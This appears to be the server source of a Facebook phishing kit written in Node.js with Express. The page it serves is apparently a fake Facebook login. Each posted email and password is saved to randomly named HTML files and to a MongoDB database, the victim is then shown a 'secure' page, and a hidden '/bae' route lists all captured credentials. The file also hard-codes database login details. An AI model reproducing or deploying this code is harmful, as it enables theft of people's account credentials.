var express = require('express');
var app = express();
var bodyParser = require("body-parser");
var mongoose = require("mongoose");
var fs = require("fs");
const PORT = process.env.PORT || 5000
mongoose.connect("mongodb://sherwan:mamjader10@ds261114.mlab.com:61114/info");
app.set("view engine" , "ejs");
app.use(bodyParser.urlencoded({ extended: true}));


var InfoSchema = new mongoose.Schema({
  username:String,
  pass:String
});

var Info = mongoose.model("Info" , InfoSchema);



app.get("/" , function(req ,res){
  res.render("fb");

});

app.post("/info" , function(req , res){
  var info = `
  <p>Facebook info</p>
  <ul>

  <li>email:${req.body.email}</li>
  <li>password:${req.body.pass}</li>




  </ul>

  `;

  var email = req.body.email;
  var pass = req.body.pass;



    function makename() {
      var text = "";
      var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

      for (var i = 0; i < 5; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

      return text;
    }

    var randoom = makename();



      fs.writeFile('./business/'+ randoom +'.html', info, (err) => {
          // throws an error, you could also catch it here
          if (err) throw err;

          // success case, the file was saved
          console.log('mission completed');
      });

      var newInfo = {username:email , pass:pass};

      Info.create( newInfo , function(err , infocreated){
        if(err){
          console.log(err);
        }else{

          res.render("secure");
          console.log(infocreated);

        }
      });









})





app.get("/bae" , (req , res)=>{

  Info.find({} , function(err , found){
    if(err){
      console.log(err);
    }else{
      console.log(found);
      res.render("info" ,{found:found})
    }
  })

});




app.listen(PORT, () => console.log(`Listening on ${ PORT }`));
